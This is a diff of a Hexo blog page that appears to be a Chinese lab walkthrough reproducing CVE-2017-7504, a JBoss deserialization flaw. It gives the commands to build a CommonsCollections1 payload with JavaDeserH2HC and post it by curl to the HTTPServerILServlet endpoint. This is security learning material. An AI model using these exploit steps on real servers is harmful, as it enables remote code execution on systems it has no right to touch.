@@ -41,8 +41,8 @@
     <script src="https://test1.jsdelivr.net/gh/enomothem/cdn@1.5.0/sources/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 5.4.0">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 
 
@@ -641,7 +641,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-16
+                    2022-06-01
                 </div>
                 
 
@@ -677,25 +677,25 @@
             <div id="articleContent">
                 <h1 id="复现CVE-2017-7504-Jboss反序列化漏洞"><a href="#复现CVE-2017-7504-Jboss反序列化漏洞" class="headerlink" title="复现CVE-2017-7504:Jboss反序列化漏洞"></a>复现CVE-2017-7504:Jboss反序列化漏洞</h1><h2 id="Xx-Introduction"><a href="#Xx-Introduction" class="headerlink" title="Xx Introduction"></a>Xx Introduction</h2><p>Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。 Red Hat Jboss AS 4.X及之前的版本中的JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在安全漏洞。远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
 <h2 id="Ax-Preparation"><a href="#Ax-Preparation" class="headerlink" title="Ax Preparation"></a>Ax Preparation</h2><p>使用docker搭建漏洞环境。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210219140902.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/20210219140902.png"></p>
 <p>打开浏览器访问该web页面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210219140851.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/20210219140851.png"></p>
 <p>下载利用工具</p>
 <p><code>git clone https://github.com/joaomatosf/JavaDeserH2HC</code></p>
 <p>编译序列化数据，命令是在/opt下创建一个ok.txt文本文件</p>
 <pre class=" language-java"><code class="language-java">javac <span class="token operator">-</span>cp <span class="token punctuation">.</span><span class="token punctuation">:</span>commons<span class="token operator">-</span>collections<span class="token operator">-</span><span class="token number">3.2</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>jar ExampleCommonsCollections1WithHashMap<span class="token punctuation">.</span>java
 java <span class="token operator">-</span>cp <span class="token punctuation">.</span><span class="token punctuation">:</span>commons<span class="token operator">-</span>collections<span class="token operator">-</span><span class="token number">3.2</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>jar ExampleCommonsCollections1WithHashMap <span class="token string">"touch /opt/ok.txt"</span>
 </code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210219144428.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/20210219144428.png"></p>
 <p>这时，会多出一个ser的文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210219141344.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/20210219141344.png"></p>
 <h2 id="Bx-Exploit"><a href="#Bx-Exploit" class="headerlink" title="Bx Exploit"></a>Bx Exploit</h2><p><code>curl http://IP:8080/4444/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210219141752.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/20210219141752.png"></p>
 <p>再使用docker-compoose验证漏洞</p>
 <p><code>docker-compose exec jboss bash</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210219144517.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/20210219144517.png"></p>
 <p>查看是否创建成功，命令是否执行，进入/opt目录下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210219144538.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/20210219144538.png"></p>
 <p>成功。</p>
 <h2 id="Cx-Declaration"><a href="#Cx-Declaration" class="headerlink" title="Cx Declaration"></a>Cx Declaration</h2><ul>
 <li>请遵守，爱护《中华人民共和国网络安全法》</li>
